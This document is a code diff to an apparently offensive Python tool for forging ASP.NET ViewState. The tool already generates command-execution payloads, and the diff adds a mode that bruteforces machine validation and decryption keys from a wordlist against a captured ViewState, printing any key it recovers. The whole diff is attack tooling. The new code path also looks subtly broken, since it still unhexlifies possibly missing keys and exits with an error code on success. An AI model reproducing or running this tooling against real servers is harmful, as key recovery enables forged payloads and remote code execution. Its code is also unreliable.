@@ -255,6 +255,7 @@ def parse_args():
 	parser.add_argument("-e", "--encrypted", help="ViewState is encrypted", required=False, default=False, action="store_true")
 	parser.add_argument("payload", help="ViewState payload (base 64 encoded)", nargs="?")
 	parser.add_argument("-f", "--file", help="read ViewState payload from file", required=False)
+	parser.add_argument("-b", "--bruteforce", help="bruteforce encryption and validation algorithms", required=False, default=False, action="store_true")
 	args = parser.parse_args()
 
 	if len(sys.argv) == 1:
@@ -279,8 +280,11 @@ def run_viewgen(args):
 
 	if generate or args.check:
 		if not args.vkey or not args.valg or not args.dkey or not args.dalg:
-			warning("Please provide validation/decryption keys and algorithms or a valid web.config")
-			exit(1)
+			if args.bruteforce:
+				success("Bruteforcing algorithms")
+			else:
+				warning("Please provide validation/decryption keys and algorithms or a valid web.config")
+				exit(1)
 
 	viewgen = ViewGen(binascii.unhexlify(args.vkey), args.valg, binascii.unhexlify(args.dkey), args.dalg, args.modifier, args.encrypted)
 
@@ -297,7 +301,7 @@ def run_viewgen(args):
 		viewstate, sb = viewgen.decode(encoded)
 
 		if sa == sb:
-			success("Signature match")
+			success(f"Signature match")
 		else:
 			warning("Signature fail")
 
@@ -326,6 +330,33 @@ def run_viewgen(args):
 		else:
 			result = viewgen.encode(generate_shell_payload(args.command))
 		print(str(result, "utf-8"))
+
+	if args.bruteforce:
+		machine_keys = []
+		with open("machine_keys.txt") as f:
+			machine_keys = f.read().splitlines()
+		for mk in machine_keys:
+			viewgen.validation_key, viewgen.dec_key = mk.split(",")
+			viewgen.validation_key, viewgen.dec_key = binascii.unhexlify(viewgen.validation_key), binascii.unhexlify(viewgen.dec_key)
+			for valg in ViewGen.hash_algs.keys():
+				for dalg in ["AES", "3DES", "DES"]:
+					viewgen.validation_alg = valg
+					viewgen.dec_alg = dalg
+					viewstate, sa = viewgen.decode(args.payload)
+					encoded = viewgen.encode(viewstate, reuse_iv=True)
+					viewstate, sb = viewgen.decode(encoded)
+
+					if sa == sb:
+						success(f"Signature match")
+						success(f"Validation Algorithm: {viewgen.validation_alg}")
+						success(f"Validation Key: {binascii.hexlify(viewgen.validation_key).decode('utf-8')}")
+						success(f"Decryption Algorithm: {viewgen.dec_alg}")
+						success(f"Decryption Key: {binascii.hexlify(viewgen.dec_key).decode('utf-8')}")
+						exit(1)
+					else:
+						warning("Signature fail")
+
+
 
 
 if __name__ == "__main__":
